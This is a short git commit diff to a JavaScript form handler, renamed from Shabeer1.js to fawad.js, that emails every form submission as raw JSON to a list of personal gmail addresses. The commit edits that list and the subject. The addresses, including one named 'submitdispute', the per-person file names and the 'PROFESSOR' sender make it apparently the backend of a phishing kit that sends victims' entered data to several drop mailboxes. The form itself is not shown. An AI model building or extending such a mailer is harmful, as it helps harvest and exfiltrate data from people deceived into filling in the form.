681f0bbe56470d780c6adb030c6962a8f384ea91
zm9807350 <zm9807350@gmail.com>
2026-01-21 12:09:55 +0500

    Update and rename Shabeer1.js to fawad.js

--- fawad.js
+++ fawad.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,professormarina4@gmail.com",
-      subject: "Shabeer1",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,nadeemalinizamani45@gmail.com,adsmarketingnetwork@gmail.com",
+      subject: "Fawad",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
